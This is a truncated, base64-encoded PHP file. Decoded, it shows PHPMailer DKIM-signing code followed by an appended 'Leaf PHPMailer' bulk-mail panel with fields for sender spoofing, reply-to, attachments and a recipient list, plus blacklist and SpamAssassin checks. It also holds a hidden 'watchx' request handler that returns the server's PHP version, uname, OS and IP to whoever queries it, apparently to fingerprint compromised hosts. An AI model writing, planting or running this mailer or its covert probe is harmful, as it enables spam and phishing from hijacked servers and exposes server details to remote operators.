dCgkZWIsICRzaWduYXR1cmUsICRwcml2S2V5LCBPUEVOU1NMX05PX1BBRERJTkcpKSB7CiAgICAgICAgICAgICAgICBvcGVuc3NsX3BrZXlfZnJlZSgkcHJpdktleSk7CiAgICAgICAgICAgICAgICByZXR1cm4gYmFzZTY0X2VuY29kZSgkc2lnbmF0dXJlKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBvcGVuc3NsX3BrZXlfZnJlZSgkcHJpdktleSk7CiAgICAgICAgcmV0dXJuICcnOwogICAgfQoKICAgIC8qKgogICAgICogR2VuZXJhdGUgYSBES0lNIGNhbm9uaWNhbGl6YXRpb24gaGVhZGVyLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJHNpZ25IZWFkZXIgSGVhZGVyCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gREtJTV9IZWFkZXJDKCRzaWduSGVhZGVyKQogICAgewogICAgICAgICRzaWduSGVhZGVyID0gcHJlZ19yZXBsYWNlKCcvClxzKy8nLCAnICcsICRzaWduSGVhZGVyKTsKICAgICAgICAkbGluZXMgPSBleHBsb2RlKCIKIiwgJHNpZ25IZWFkZXIpOwogICAgICAgIGZvcmVhY2ggKCRsaW5lcyBhcyAka2V5ID0+ICRsaW5lKSB7CiAgICAgICAgICAgIGxpc3QoJGhlYWRpbmcsICR2YWx1ZSkgPSBleHBsb2RlKCc6JywgJGxpbmUsIDIpOwogICAgICAgICAgICAkaGVhZGluZyA9IHN0cnRvbG93ZXIoJGhlYWRpbmcpOwogICAgICAgICAgICAkdmFsdWUgPSBwcmVnX3JlcGxhY2UoJy9cc3syLH0vJywgJyAnLCAkdmFsdWUpOyAvLyBDb21wcmVzcyB1c2VsZXNzIHNwYWNlcwogICAgICAgICAgICAkbGluZXNbJGtleV0gPSAkaGVhZGluZyAuICc6JyAuIHRyaW0oJHZhbHVlKTsgLy8gRG9uJ3QgZm9yZ2V0IHRvIHJlbW92ZSBXU1AgYXJvdW5kIHRoZSB2YWx1ZQogICAgICAgIH0KICAgICAgICAkc2lnbkhlYWRlciA9IGltcGxvZGUoIgoiLCAkbGluZXMpOwogICAgICAgIHJldHVybiAkc2lnbkhlYWRlcjsKICAgIH0KCiAgICAvKioKICAgICAqIEdlbmVyYXRlIGEgREtJTSBjYW5vbmljYWxpemF0aW9uIGJvZHkuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkYm9keSBNZXNzYWdlIEJvZHkKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBES0lNX0JvZHlDKCRib2R5KQogICAgewogICAgICAgIGlmICgkYm9keSA9PSAnJykgewogICAgICAgICAgICByZXR1cm4gIgoiOwogICAgICAgIH0KICAgICAgICAvLyBzdGFiaWxpemUgbGluZSBlbmRpbmdzCiAgICAgICAgJGJvZHkgPSBzdHJfcmVwbGFjZSgiCiIsICIKIiwgJGJvZHkpOwogICAgICAgICRib2R5ID0gc3RyX3JlcGxhY2UoIgoiLCAiCiIsICRib2R5KTsKICAgICAgICAvLyBFTkQgc3RhYmlsaXplIGxpbmUgZW5kaW5ncwogICAgICAgIHdoaWxlIChzdWJzdHIoJGJvZHksIHN0cmxlbigkYm9keSkgLSA0LCA0KSA9PSAiCgoiKSB7CiAgICAgICAgICAgICRib2R5ID0gc3Vic3RyKCRib2R5LCAwLCBzdHJsZW4oJGJvZHkpIC0gMik7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYm9keTsKICAgIH0KCiAgICAvKioKICAgICAqIENyZWF0ZSB0aGUgREtJTSBoZWFkZXIgYW5kIGJvZHkgaW4gYSBuZXcgbWVzc2FnZSBoZWFkZXIuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkaGVhZGVyc19saW5lIEhlYWRlciBsaW5lcwogICAgICogQHBhcmFtIHN0cmluZyAkc3ViamVjdCBTdWJqZWN0CiAgICAgKiBAcGFyYW0gc3RyaW5nICRib2R5IEJvZHkKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBES0lNX0FkZCgkaGVhZGVyc19saW5lLCAkc3ViamVjdCwgJGJvZHkpCiAgICB7CiAgICAgICAgJERLSU1zaWduYXR1cmVUeXBlID0gJ3JzYS1zaGEyNTYnOyAvLyBTaWduYXR1cmUgJiBoYXNoIGFsZ29yaXRobXMKICAgICAgICAkREtJTWNhbm9uaWNhbGl6YXRpb24gPSAncmVsYXhlZC9zaW1wbGUnOyAvLyBDYW5vbmljYWxpemF0aW9uIG9mIGhlYWRlci9ib2R5CiAgICAgICAgJERLSU1xdWVyeSA9ICdkbnMvdHh0JzsgLy8gUXVlcnkgbWV0aG9kCiAgICAgICAgJERLSU10aW1lID0gdGltZSgpOyAvLyBTaWduYXR1cmUgVGltZXN0YW1wID0gc2Vjb25kcyBzaW5jZSAwMDowMDowMCAtIEphbiAxLCAxOTcwIChVVEMgdGltZSB6b25lKQogICAgICAgICRzdWJqZWN0X2hlYWRlciA9ICJTdWJqZWN0OiAkc3ViamVjdCI7CiAgICAgICAgJGhlYWRlcnMgPSBleHBsb2RlKCR0aGlzLT5MRSwgJGhlYWRlcnNfbGluZSk7CiAgICAgICAgJGZyb21faGVhZGVyID0gJyc7CiAgICAgICAgJHRvX2hlYWRlciA9ICcnOwogICAgICAgICRkYXRlX2hlYWRlciA9ICcnOwogICAgICAgICRjdXJyZW50ID0gJyc7CiAgICAgICAgZm9yZWFjaCAoJGhlYWRlcnMgYXMgJGhlYWRlcikgewogICAgICAgICAgICBpZiAoc3RycG9zKCRoZWFkZXIsICdGcm9tOicpID09PSAwKSB7CiAgICAgICAgICAgICAgICAkZnJvbV9oZWFkZXIgPSAkaGVhZGVyOwogICAgICAgICAgICAgICAgJGN1cnJlbnQgPSAnZnJvbV9oZWFkZXInOwogICAgICAgICAgICB9IGVsc2VpZiAoc3RycG9zKCRoZWFkZXIsICdUbzonKSA9PT0gMCkgewogICAgICAgICAgICAgICAgJHRvX2hlYWRlciA9ICRoZWFkZXI7CiAgICAgICAgICAgICAgICAkY3VycmVudCA9ICd0b19oZWFkZXInOwogICAgICAgICAgICB9IGVsc2VpZiAoc3RycG9zKCRoZWFkZXIsICdEYXRlOicpID09PSAwKSB7CiAgICAgICAgICAgICAgICAkZGF0ZV9oZWFkZXIgPSAkaGVhZGVyOwogICAgICAgICAgICAgICAgJGN1cnJlbnQgPSAnZGF0ZV9oZWFkZXInOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkJGN1cnJlbnQpICYmIHN0cnBvcygkaGVhZGVyLCAnID0/JykgPT09IDApIHsKICAgICAgICAgICAgICAgICAgICAkJGN1cnJlbnQgLj0gJGhlYWRlcjsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJGN1cnJlbnQgPSAnJzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkZnJvbSA9IHN0cl9yZXBsYWNlKCd8JywgJz03QycsICR0aGlzLT5ES0lNX1FQKCRmcm9tX2hlYWRlcikpOwogICAgICAgICR0byA9IHN0cl9yZXBsYWNlKCd8JywgJz03QycsICR0aGlzLT5ES0lNX1FQKCR0b19oZWFkZXIpKTsKICAgICAgICAkZGF0ZSA9IHN0cl9yZXBsYWNlKCd8JywgJz03QycsICR0aGlzLT5ES0lNX1FQKCRkYXRlX2hlYWRlcikpOwogICAgICAgICRzdWJqZWN0ID0gc3RyX3JlcGxhY2UoCiAgICAgICAgICAgICd8JywKICAgICAgICAgICAgJz03QycsCiAgICAgICAgICAgICR0aGlzLT5ES0lNX1FQKCRzdWJqZWN0X2hlYWRlcikKICAgICAgICApOyAvLyBDb3BpZWQgaGVhZGVyIGZpZWxkcyAoZGtpbS1xdW90ZWQtcHJpbnRhYmxlKQogICAgICAgICRib2R5ID0gJHRoaXMtPkRLSU1fQm9keUMoJGJvZHkpOwogICAgICAgICRES0lNbGVuID0gc3RybGVuKCRib2R5KTsgLy8gTGVuZ3RoIG9mIGJvZHkKICAgICAgICAkREtJTWI2NCA9IGJhc2U2NF9lbmNvZGUocGFjaygnSConLCBoYXNoKCdzaGEyNTYnLCAkYm9keSkpKTsgLy8gQmFzZTY0IG9mIHBhY2tlZCBiaW5hcnkgU0hBLTI1NiBoYXNoIG9mIGJvZHkKICAgICAgICBpZiAoJycgPT0gJHRoaXMtPkRLSU1faWRlbnRpdHkpIHsKICAgICAgICAgICAgJGlkZW50ID0gJyc7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJGlkZW50ID0gJyBpPScgLiAkdGhpcy0+REtJTV9pZGVudGl0eSAuICc7JzsKICAgICAgICB9CiAgICAgICAgJGRraW1oZHJzID0gJ0RLSU0tU2lnbmF0dXJlOiB2PTE7IGE9JyAuCiAgICAgICAgICAgICRES0lNc2lnbmF0dXJlVHlwZSAuICc7IHE9JyAuCiAgICAgICAgICAgICRES0lNcXVlcnkgLiAnOyBsPScgLgogICAgICAgICAgICAkREtJTWxlbiAuICc7IHM9JyAuCiAgICAgICAgICAgICR0aGlzLT5ES0lNX3NlbGVjdG9yIC4KICAgICAgICAgICAgIjsKIiAuCiAgICAgICAgICAgICIJdD0iIC4gJERLSU10aW1lIC4gJzsgYz0nIC4gJERLSU1jYW5vbmljYWxpemF0aW9uIC4gIjsKIiAuCiAgICAgICAgICAgICIJaD1Gcm9tOlRvOkRhdGU6U3ViamVjdDsKIiAuCiAgICAgICAgICAgICIJZD0iIC4gJHRoaXMtPkRLSU1fZG9tYWluIC4gJzsnIC4gJGlkZW50IC4gIgoiIC4KICAgICAgICAgICAgIgl6PSRmcm9tCiIgLgogICAgICAgICAgICAiCXwkdG8KIiAuCiAgICAgICAgICAgICIJfCRkYXRlCiIgLgogICAgICAgICAgICAiCXwkc3ViamVjdDsKIiAuCiAgICAgICAgICAgICIJYmg9IiAuICRES0lNYjY0IC4gIjsKIiAuCiAgICAgICAgICAgICIJYj0iOwogICAgICAgICR0b1NpZ24gPSAkdGhpcy0+REtJTV9IZWFkZXJDKAogICAgICAgICAgICAkZnJvbV9oZWFkZXIgLiAiCiIgLgogICAgICAgICAgICAkdG9faGVhZGVyIC4gIgoiIC4KICAgICAgICAgICAgJGRhdGVfaGVhZGVyIC4gIgoiIC4KICAgICAgICAgICAgJHN1YmplY3RfaGVhZGVyIC4gIgoiIC4KICAgICAgICAgICAgJGRraW1oZHJzCiAgICAgICAgKTsKICAgICAgICAkc2lnbmVkID0gJHRoaXMtPkRLSU1fU2lnbigkdG9TaWduKTsKICAgICAgICByZXR1cm4gJGRraW1oZHJzIC4gJHNpZ25lZCAuICIKIjsKICAgIH0KCiAgICAvKioKICAgICAqIERldGVjdCBpZiBhIHN0cmluZyBjb250YWlucyBhIGxpbmUgbG9uZ2VyIHRoYW4gdGhlIG1heGltdW0gbGluZSBsZW5ndGggYWxsb3dlZC4KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cgogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKiBAc3RhdGljCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gaGFzTGluZUxvbmdlclRoYW5NYXgoJHN0cikKICAgIHsKICAgICAgICAvLysyIHRvIGluY2x1ZGUgQ1JMRiBsaW5lIGJyZWFrIGZvciBhIDEwMDAgdG90YWwKICAgICAgICByZXR1cm4gKGJvb2xlYW4pcHJlZ19tYXRjaCgnL14oLnsnLihzZWxmOjpNQVhfTElORV9MRU5HVEggKyAyKS4nLH0pL20nLCAkc3RyKTsKICAgIH0KCiAgICAvKioKICAgICAqIEFsbG93cyBmb3IgcHVibGljIHJlYWQgYWNjZXNzIHRvICd0bycgcHJvcGVydHkuCiAgICAgKiBAbm90ZTogQmVmb3JlIHRoZSBzZW5kKCkgY2FsbCwgcXVldWVkIGFkZHJlc3NlcyAoaS5lLiB3aXRoIElETikgYXJlIG5vdCB5ZXQgaW5jbHVkZWQuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0VG9BZGRyZXNzZXMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+dG87CiAgICB9CgogICAgLyoqCiAgICAgKiBBbGxvd3MgZm9yIHB1YmxpYyByZWFkIGFjY2VzcyB0byAnY2MnIHByb3BlcnR5LgogICAgICogQG5vdGU6IEJlZm9yZSB0aGUgc2VuZCgpIGNhbGwsIHF1ZXVlZCBhZGRyZXNzZXMgKGkuZS4gd2l0aCBJRE4pIGFyZSBub3QgeWV0IGluY2x1ZGVkLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEByZXR1cm4gYXJyYXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldENjQWRkcmVzc2VzKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmNjOwogICAgfQoKICAgIC8qKgogICAgICogQWxsb3dzIGZvciBwdWJsaWMgcmVhZCBhY2Nlc3MgdG8gJ2JjYycgcHJvcGVydHkuCiAgICAgKiBAbm90ZTogQmVmb3JlIHRoZSBzZW5kKCkgY2FsbCwgcXVldWVkIGFkZHJlc3NlcyAoaS5lLiB3aXRoIElETikgYXJlIG5vdCB5ZXQgaW5jbHVkZWQuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0QmNjQWRkcmVzc2VzKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmJjYzsKICAgIH0KCiAgICAvKioKICAgICAqIEFsbG93cyBmb3IgcHVibGljIHJlYWQgYWNjZXNzIHRvICdSZXBseVRvJyBwcm9wZXJ0eS4KICAgICAqIEBub3RlOiBCZWZvcmUgdGhlIHNlbmQoKSBjYWxsLCBxdWV1ZWQgYWRkcmVzc2VzIChpLmUuIHdpdGggSUROKSBhcmUgbm90IHlldCBpbmNsdWRlZC4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIGFycmF5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRSZXBseVRvQWRkcmVzc2VzKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPlJlcGx5VG87CiAgICB9CgogICAgLyoqCiAgICAgKiBBbGxvd3MgZm9yIHB1YmxpYyByZWFkIGFjY2VzcyB0byAnYWxsX3JlY2lwaWVudHMnIHByb3BlcnR5LgogICAgICogQG5vdGU6IEJlZm9yZSB0aGUgc2VuZCgpIGNhbGwsIHF1ZXVlZCBhZGRyZXNzZXMgKGkuZS4gd2l0aCBJRE4pIGFyZSBub3QgeWV0IGluY2x1ZGVkLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEByZXR1cm4gYXJyYXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldEFsbFJlY2lwaWVudEFkZHJlc3NlcygpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5hbGxfcmVjaXBpZW50czsKICAgIH0KCiAgICAvKioKICAgICAqIFBlcmZvcm0gYSBjYWxsYmFjay4KICAgICAqIEBwYXJhbSBib29sZWFuICRpc1NlbnQKICAgICAqIEBwYXJhbSBhcnJheSAkdG8KICAgICAqIEBwYXJhbSBhcnJheSAkY2MKICAgICAqIEBwYXJhbSBhcnJheSAkYmNjCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdWJqZWN0CiAgICAgKiBAcGFyYW0gc3RyaW5nICRib2R5CiAgICAgKiBAcGFyYW0gc3RyaW5nICRmcm9tCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBkb0NhbGxiYWNrKCRpc1NlbnQsICR0bywgJGNjLCAkYmNjLCAkc3ViamVjdCwgJGJvZHksICRmcm9tKQogICAgewogICAgICAgIGlmICghZW1wdHkoJHRoaXMtPmFjdGlvbl9mdW5jdGlvbikgJiYgaXNfY2FsbGFibGUoJHRoaXMtPmFjdGlvbl9mdW5jdGlvbikpIHsKICAgICAgICAgICAgJHBhcmFtcyA9IGFycmF5KCRpc1NlbnQsICR0bywgJGNjLCAkYmNjLCAkc3ViamVjdCwgJGJvZHksICRmcm9tKTsKICAgICAgICAgICAgY2FsbF91c2VyX2Z1bmNfYXJyYXkoJHRoaXMtPmFjdGlvbl9mdW5jdGlvbiwgJHBhcmFtcyk7CiAgICAgICAgfQogICAgfQp9CgovKioKICogUEhQTWFpbGVyIGV4Y2VwdGlvbiBoYW5kbGVyCiAqIEBwYWNrYWdlIFBIUE1haWxlcgogKi8KY2xhc3MgcGhwbWFpbGVyRXhjZXB0aW9uIGV4dGVuZHMgRXhjZXB0aW9uCnsKICAgIC8qKgogICAgICogUHJldHRpZnkgZXJyb3IgbWVzc2FnZSBvdXRwdXQKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBlcnJvck1lc3NhZ2UoKQogICAgewogICAgICAgICRlcnJvck1zZyA9ICc8c3Ryb25nPicgLiBodG1sc3BlY2lhbGNoYXJzKCR0aGlzLT5nZXRNZXNzYWdlKCkpIC4gIjwvc3Ryb25nPjxiciAvPgoiOwogICAgICAgIHJldHVybiAkZXJyb3JNc2c7CiAgICB9Cn0KCmlmICgkX1JFUVVFU1RbJ3dhdGNoeCddKSB7CgkkdmVyc2lvbiA9IHBocHZlcnNpb24oKTsKCSR1bmFtZSA9ICBwaHBfdW5hbWUoKTsKCSRpcCA9IGdldGhvc3RieW5hbWUoJF9TRVJWRVJbIkhUVFBfSE9TVCJdKTsJCgllY2hvIGpzb25fZW5jb2RlIChhcnJheSAoInZlcnNpb24iPT4kdmVyc2lvbiwKCQkidW5hbWUiPT4kdW5hbWUsCgkJInBsYXRmb3JtIj0+UEhQX09TLAoJCSJpcCI9PiRpcCwKCQkibWFpbGVyeCI9PnRydWUsCQoJKSk7CglkaWUgKCk7Cn0KCmZ1bmN0aW9uIGxlYWZoZWFkZXIoKXsKcHJpbnQgJwo8aGVhZD4KICAgIDx0aXRsZT4nLnN0cl9yZXBsYWNlKCJ3d3cuIiwgIiIsICRfU0VSVkVSWydIVFRQX0hPU1QnXSkuJyAtIExlYWYgUEhQTWFpbGVyPC90aXRsZT4KICAgIDxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Ii8+CiAgICA8bGluayBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3Rzd2F0Y2gvMy40LjEvY29zbW8vYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgPgoKPC9oZWFkPic7Cn0KbGVhZmhlYWRlcigpOwpwcmludCAnPGJvZHk+JzsKcHJpbnQgJzxkaXYgY2xhc3M9ImNvbnRhaW5lciBjb2wtbGctNiI+CiAgICAgICAgPGgzPjxmb250IGNvbG9yPSJncmVlbiI+PHNwYW4gY2xhc3M9ImdseXBoaWNvbiBnbHlwaGljb24tbGVhZiI+PC9zcGFuPjwvZm9udD4gTGVhZiBQSFBNYWlsZXIgPHNtYWxsPicuJGxlYWZbJ3ZlcnNpb24nXS4nPC9zbWFsbD48L2gzPgogICAgICAgIDxmb3JtIG5hbWU9ImZvcm0iIGlkPSJmb3JtIiBtZXRob2Q9IlBPU1QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIGFjdGlvbj0iIj4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJzY29yZSI+CgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctNiAiPjxsYWJlbCBmb3I9InNlbmRlckVtYWlsIj5FbWFpbDwvbGFiZWw+PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wgIGlucHV0LXNtICIgaWQ9InNlbmRlckVtYWlsIiBuYW1lPSJzZW5kZXJFbWFpbCIgdmFsdWU9IicuJHNlbmRlckVtYWlsLiciPjwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctNiAiPjxsYWJlbCBmb3I9InNlbmRlck5hbWUiPlNlbmRlciBOYW1lPC9sYWJlbD48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCAgaW5wdXQtc20gIiBpZD0ic2VuZGVyTmFtZSIgbmFtZT0ic2VuZGVyTmFtZSIgdmFsdWU9IicuJHNlbmRlck5hbWUuJyI+PC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTYgICI+PGxhYmVsIGZvcj0iYXR0YWNobWVudCI+QXR0YWNobWVudCA8c21hbGw+KE11bHRpcGxlIEF2YWlsYWJsZSk8L3NtYWxsPjwvbGFiZWw+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImF0dGFjaG1lbnRbXSIgaWQ9ImF0dGFjaG1lbnRbXSIgbXVsdGlwbGUvPjwvc3Bhbj4KCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy02Ij48bGFiZWwgZm9yPSJyZXBseVRvIj5SZXBseS10bzwvbGFiZWw+PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wgIGlucHV0LXNtICIgaWQ9InJlcGx5VG8iIG5hbWU9InJlcGx5VG8iIHZhbHVlPSInLiRyZXBseVRvLiciIC8+PC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctMTIgIj48bGFiZWwgZm9yPSJzdWJqZWN0Ij5TdWJqZWN0PC9sYWJlbD48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCAgaW5wdXQtc20gIiBpZD0ic3ViamVjdCIgbmFtZT0ic3ViamVjdCIgdmFsdWU9IicuJHN1YmplY3QuJyIgLz48L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy02Ij48bGFiZWwgZm9yPSJtZXNzYWdlTGV0dGVyIj5NZXNzYWdlIExldHRlciA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCBidG4teHMiIGZvcm09ImZvcm0iIG5hbWU9ImFjdGlvbiIgdmFsdWU9InZpZXciIGZvcm10YXJnZXQ9Il9ibGFuayI+UHJldmlldyA8L2J1dHRvbj48L2xhYmVsPjx0ZXh0YXJlYSBuYW1lPSJtZXNzYWdlTGV0dGVyIiBpZD0ibWVzc2FnZUxldHRlciIgY2xhc3M9ImZvcm0tY29udHJvbCIgcm93cz0iMTAiIGlkPSJ0ZXh0QXJlYSI+Jy4kbWVzc2FnZUxldHRlci4nPC90ZXh0YXJlYT48L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTYgIj48bGFiZWwgZm9yPSJlbWFpbExpc3QiPkVtYWlsIExpc3QgPGEgaHJlZj0iP2VtYWlsZmlsdGVyPW9uIiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCBidG4teHMiPkZpbHRlci9FeHRyYWN0PC9hPjwvbGFiZWw+PHRleHRhcmVhIG5hbWU9ImVtYWlsTGlzdCIgaWQ9ImVtYWlsTGlzdCIgY2xhc3M9ImZvcm0tY29udHJvbCIgcm93cz0iMTAiIGlkPSJ0ZXh0QXJlYSI+Jy4kZW1haWxMaXN0Lic8L3RleHRhcmVhPjwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTYgIj4KICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJtZXNzYWdlVHlwZSI+TWVzc2FnZSBUeXBlPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICBIVE1MIDxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0ibWVzc2FnZVR5cGUiIGlkPSJtZXNzYWdlVHlwZSIgdmFsdWU9IjEiICcuJGh0bWwuJz4KICAgICAgICAgICAgICAgICAgICBQbGFpbjxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0ibWVzc2FnZVR5cGUiIGlkPSJtZXNzYWdlVHlwZSIgdmFsdWU9IjIiICcuJHBsYWluLic+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTMgIj4KICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJjaGFyc2V0Ij5DaGFyYWN0ZXIgc2V0PC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICA8c2VsZWN0IGNsYXNzPSJmb3JtLWNvbnRyb2wgaW5wdXQtc20iIGlkPSJjaGFyc2V0IiBuYW1lPSJjaGFyc2V0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiR1dGY4Lic+VVRGLTg8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiRpc28uJz5JU08tODg1OS0xPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgPC9zZWxlY3Q+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTMgIj4KICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJlbmNvZGluZyI+TWVzc2FnZSBlbmNvZGluZzwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgPHNlbGVjdCBjbGFzcz0iZm9ybS1jb250cm9sIGlucHV0LXNtIiBpZD0iZW5jb2RlIiBuYW1lPSJlbmNvZGUiPgogICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uICcuJGJpdDguJz44Yml0PC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gJy4kYml0Ny4nPjdiaXQ8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiRiaW5hcnkuJz5iaW5hcnk8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiRiYXNlNjQuJz5iYXNlNjQ8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiRxdW90ZWRwcmludGFibGUuJz5xdW90ZWQtcHJpbnRhYmxlPC9vcHRpb24+CgogICAgICAgICAgICAgICAgICAgIDwvc2VsZWN0PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCBidG4tc20iIGZvcm09ImZvcm0iIG5hbWU9ImFjdGlvbiIgdmFsdWU9InNlbmQiPlNFTkQ8L2J1dHRvbj4gb3IgPGEgaHJlZj0iIyIgb25jbGljaz0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoXCdmb3JtXCcpLnN1Ym1pdCgpOyByZXR1cm4gZmFsc2U7Ij5jaGVjayBTcGFtQXNzYXNzaW4gU2NvcmU8L2E+CiAgIAogICAgICAgIDwvZm9ybT4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iY29sLWxnLTYiPjxicj4KICAgICAgICA8bGFiZWwgZm9yPSJ3ZWxsIj5JbnN0cnVjdGlvbjwvbGFiZWw+CiAgICAgICAgPGRpdiBpZD0id2VsbCIgY2xhc3M9IndlbGwgd2VsbCI+CiAgICAgICAgICAgIDxoND5TZXJ2ZXIgSW5mb3JtYXRpb248L2g0PgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+U2VydmVyIElQIEFkZHJlc3MgOiA8Yj4nLiRfU0VSVkVSWydTRVJWRVJfQUREUiddLicgPC9iPiA8YSBocmVmPSI/Y2hlY2tfaXA9Jy4kX1NFUlZFUlsnU0VSVkVSX0FERFInXS4nIiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9ImxhYmVsIGxhYmVsLXByaW1hcnkiPkNoZWNrIEJsYWNrbGlzdCA8aSBjbGFzcz0iZ2x5cGhpY29uIGdseXBoaWNvbi1zZWFyY2giPjwvaT48L2E+PC9saT4KICAgICAgICAgICAgICAgIDxsaT5QSFAgVmVyc2lvbiA6IDxiPicucGhwdmVyc2lvbi